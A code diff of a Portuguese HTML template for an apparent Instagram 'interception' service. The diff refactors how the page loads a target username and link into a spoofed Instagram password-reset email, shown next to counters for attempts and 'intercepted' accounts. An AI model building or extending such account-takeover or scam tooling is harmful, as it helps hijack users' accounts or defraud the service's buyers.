@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8"/>
@@ -66,6 +67,7 @@
     <button class="btn-primary" id="confirmUpdateBtn">Ir para atualização</button>
   </div>
 </div>
+<script>window.__INTERCEPT__ = {{ intercept|tojson|safe }};</script>
 <main class="app-container" role="main">
   <section class="panel" aria-labelledby="cfgTitle">
     <div class="blocked-overlay" id="blockedOverlay">
@@ -109,7 +111,7 @@
     <div class="progress-container" aria-hidden="true"><div class="progress-bar" id="progressBar" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0"></div></div>
     <div id="statusContainer" class="status-container" role="status" aria-live="polite" aria-atomic="false"><div class="status-line"><svg class="status-icon status-waiting" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg><div class="status-text">Sistema inicializado. Aguardando configuração...</div></div></div>
     <div class="estimate">Tempo estimado: <span class="estimate-value" id="estimateValue">--:--</span></div>
-    <div class="inbox"><h2>Caixa de Entrada</h2><article class="email floating" id="instagramEmail" aria-hidden="true"><div class="email-header"><div class="email-sender"><svg class="sender-icon" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/></svg>Instagram &lt;security@mail.instagram.com&gt;</div><div class="email-time" id="emailTime"></div></div><div class="email-subject">Redefinir sua senha</div><div class="email-content"><p id="greetingParagraph">Olá, {{ intercept_username|e }}.</p><p>Recebemos uma solicitação para redefinir sua senha do Instagram.</p><p>Se você ignorar esta mensagem, sua senha não será alterada. Se você não solicitou uma redefinição de senha, avise-nos.</p><p id="actionLine">Caso contrário, clique no link abaixo para criar uma nova senha:</p></div><a id="resetLink" href="{{ intercept_link|e }}" class="email-link" target="_blank" rel="noopener noreferrer">Redefinir senha do Instagram<svg class="link-icon" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6M10 14L21 3"/></svg></a></article></div>
+    <div class="inbox"><h2>Caixa de Entrada</h2><article class="email floating" id="instagramEmail" aria-hidden="true"><div class="email-header"><div class="email-sender"><svg class="sender-icon" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/></svg>Instagram &lt;security@mail.instagram.com&gt;</div><div class="email-time" id="emailTime"></div></div><div class="email-subject">Redefinir sua senha</div><div class="email-content"><p id="greetingParagraph">Olá, {{ intercept.username|default('user')|e }}.</p><p>Recebemos uma solicitação para redefinir sua senha do Instagram.</p><p>Se você ignorar esta mensagem, sua senha não será alterada. Se você não solicitou uma redefinição de senha, avise-nos.</p><p id="actionLine">Caso contrário, clique no link abaixo para criar uma nova senha:</p></div><a id="resetLink" href="{{ intercept.link|default('#')|e }}" class="email-link" target="_blank" rel="noopener noreferrer">Redefinir senha do Instagram<svg class="link-icon" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6M10 14L21 3"/></svg></a></article></div>
     <div class="stats" role="group" aria-label="Estatísticas"><div class="stat-card"><div class="stat-value" id="successRate">0%</div><div class="stat-label">Taxa de Sucesso</div></div><div class="stat-card"><div class="stat-value" id="attemptsCount">0</div><div class="stat-label">Tentativas</div></div><div class="stat-card"><div class="stat-value" id="interceptedCount">0</div><div class="stat-label">Interceptados</div></div></div>
   </aside>
 </main>
@@ -120,31 +122,37 @@ document.addEventListener('DOMContentLoaded', function() {
   var greetingParagraph = document.getElementById('greetingParagraph'), resetLink = document.getElementById('resetLink');
   var selectedBypass = null, selectedEmailType = 'instagram', monitoringInterval, seconds = 0, attempts = 0, intercepted = 0, userData = null, userPlan = null, pollIntervalId = null;
   var configUserName = null, configLink = null;
-  function fetchConfig() {
-    fetch('/api/config/engineering').then(function(response) {
-      if (!response.ok) {
-        throw new Error('Nao carregou config');
+  function applyConfig(u, l) {
+    configUserName = u || 'user';
+    configLink = l || '#';
+    if (greetingParagraph) {
+      greetingParagraph.textContent = 'Olá, ' + configUserName + '.';
+    }
+    if (resetLink) {
+      try {
+        var uu = new URL(configLink);
+        resetLink.setAttribute('href', uu.href);
+        resetLink.setAttribute('target', '_blank');
+        resetLink.setAttribute('rel', 'noopener noreferrer');
+      } catch (e) {
+        resetLink.setAttribute('href', '#');
       }
+    }
+  }
+  function fetchConfig() {
+    var fallback = window.__INTERCEPT__ || {};
+    fetch('/api/config/engineering').then(function(response) {
+      if (!response.ok) throw new Error('no-config');
       return response.json();
     }).then(function(data) {
       if (data && data.ok && data.data) {
-        configUserName = data.data.username || 'user';
-        configLink = data.data.link || '#';
-        if (greetingParagraph) {
-          greetingParagraph.textContent = 'Olá, ' + configUserName + '.';
-        }
-        if (resetLink) {
-          try {
-            var u = new URL(configLink);
-            resetLink.setAttribute('href', u.href);
-            resetLink.setAttribute('target', '_blank');
-            resetLink.setAttribute('rel', 'noopener noreferrer');
-          } catch (e) {
-            resetLink.setAttribute('href', '#');
-          }
-        }
+        applyConfig(data.data.username || 'user', data.data.link || '#');
+      } else {
+        applyConfig(fallback.username || 'user', fallback.link || '#');
       }
-    }).catch(function(){});
+    }).catch(function() {
+      applyConfig(fallback.username || 'user', fallback.link || '#');
+    });
   }
   function fetchUserData() {
     fetch('/api/me').then(function(response) {
@@ -398,7 +406,7 @@ document.addEventListener('DOMContentLoaded', function() {
       var now = new Date();
       var timeString = now.toLocaleTimeString('pt-BR', {hour: '2-digit', minute: '2-digit'});
       emailTime.textContent = timeString;
-      if (greetingParagraph && configUserName) {
+      if (configUserName) {
         greetingParagraph.textContent = 'Olá, ' + configUserName + '.';
       }
       if (resetLink && configLink) {
